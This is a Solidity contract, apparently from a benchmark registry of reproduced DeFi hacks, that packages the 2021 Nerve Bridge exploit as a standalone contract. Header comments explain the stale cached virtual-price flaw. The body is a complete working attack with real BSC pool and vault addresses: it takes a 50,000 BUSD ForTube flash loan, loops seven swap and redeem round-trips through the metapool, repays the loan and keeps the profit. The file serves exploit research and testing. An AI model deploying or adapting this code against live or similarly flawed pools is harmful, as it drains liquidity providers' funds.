// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-12-NerveBridge).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the ForTube flash-loan callback `executeOperation` lives on the test
// itself (`receiver = address(this)`), and there is no standalone contract to
// deploy. This file is a faithful, self-contained copy of that inline attack
// (testExploit body + executeOperation callback + swap round-trip + minimal
// inline interfaces — no imports so it compiles anywhere), compiled inside the
// registry forge project. Logic and constants are copied verbatim from
// test/NerveBridge_exp.sol.
//
// Root cause: Nerve Bridge's MetaSwap (a Saddle-style metapool) values its base-
// pool LP token with a CACHED `baseVirtualPrice` that is only refreshed every
// BASE_CACHE_EXPIRE_TIME (10 minutes), while the base `nerve3pool` values the
// very same LP with its LIVE virtual price. A single transaction can therefore
// buy the LP cheap inside the metapool and redeem/redeposit it at the real
// (higher) price, pocketing the difference — repeatedly. The attacker flash-
// loans 50,000 BUSD from ForTube, round-trips it 7x through the metapool, exits
// to BUSD on Ellipsis, repays the flash loan, and keeps ~39,052 BUSD.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IFortube {
    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;
}

// ForTube calls executeOperation on the receiver; it also takes back amount+fee
// from the receiver, so the exploit must hold the BUSD to repay (it does, after
// the exit swap). The callback signature is copied verbatim from the test.
interface IFlashReceiver {
    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external;
}

interface ISaddle {
    function swap(uint8 i, uint8 j, uint256 dx, uint256 min_dy, uint256 deadline) external returns (uint256);

    function swapUnderlying(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline
    ) external returns (uint256);
}

interface ISwap {
    function removeLiquidityOneToken(
        uint256 tokenAmount,
        uint8 tokenIndex,
        uint256 minAmount,
        uint256 deadline
    ) external returns (uint256);
}

interface IcurveYSwap {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

contract NerveBridgeDrain {
    // Copied verbatim from test/NerveBridge_exp.sol.
    IFortube constant flashloanProvider = IFortube(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);
    address constant nerve3lp = 0xf2511b5E4FB0e5E2d123004b672BA14850478C14;
    address constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant fusd = 0x049d68029688eAbF473097a2fC38ef61633A3C7A;
    address constant fusdPool = 0x556ea0b4c06D043806859c9490072FaadC104b63;
    address constant metaSwapPool = 0xd0fBF0A224563D5fFc8A57e4fdA6Ae080EbCf3D3;
    address constant nerve3pool = 0x1B3771a66ee31180906972580adE9b81AFc5fCDc;
    // ForTube moves borrowed BUSD out of this vault and checks repayment there.
    address constant fortubeVault = 0xc78248D676DeBB4597e88071D3d889eCA70E5469;

    uint256 constant FLASH_AMOUNT = 50_000 ether; // 50,000 BUSD (18 decimals here)

    // Entry point: flash-loan 50,000 BUSD from ForTube. executeOperation below
    // drains the value, and the kept BUSD remains on this contract (the profit is
    // scored as this contract's BUSD balance delta).
    function run() external {
        flashloanProvider.flashloan(address(this), busd, FLASH_AMOUNT, "0x");
    }

    // ForTube flash-loan callback — copied verbatim from ContractTest.executeOperation.
    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {
        IERC20(busd).approve(fusdPool, type(uint256).max);
        IERC20(fusd).approve(metaSwapPool, type(uint256).max);
        IERC20(nerve3lp).approve(nerve3pool, type(uint256).max);
        IERC20(busd).approve(metaSwapPool, type(uint256).max);

        // 2. swap from 50000 busd to fusd on Ellipsis
        IERC20(fusd).approve(fusdPool, type(uint256).max);
        IcurveYSwap(fusdPool).exchange_underlying(1, 0, IERC20(busd).balanceOf(address(this)), 1);

        for (uint8 i = 0; i < 7; i++) {
            swap();
        }

        // 6. swap from fusd to busd on Ellipsis
        IcurveYSwap(fusdPool).exchange_underlying(0, 1, IERC20(fusd).balanceOf(address(this)), 1);

        // 7. payback flashloan (amount + fee) to the ForTube vault.
        IERC20(busd).transfer(fortubeVault, amount + fee);
    }

    // One metapool round-trip — copied verbatim from ContractTest.swap().
    function swap() public {
        // 3. swap from fusd to Nerve 3-LP token on metaSwapPool (cached-price curve)
        ISaddle(metaSwapPool).swap(0, 1, IERC20(fusd).balanceOf(address(this)), 1, block.timestamp);

        // 4. remove liquidity Nerve.3pool with lp tokens to remove the liquidity of BUSD
        ISwap(nerve3pool).removeLiquidityOneToken(IERC20(nerve3lp).balanceOf(address(this)), 0, 1, block.timestamp);

        // 5. invoking the swapUnderlying function of MetaSwap to swap BUSD for fUSDT
        ISaddle(metaSwapPool).swapUnderlying(1, 0, IERC20(busd).balanceOf(address(this)), 1, block.timestamp);
    }
}
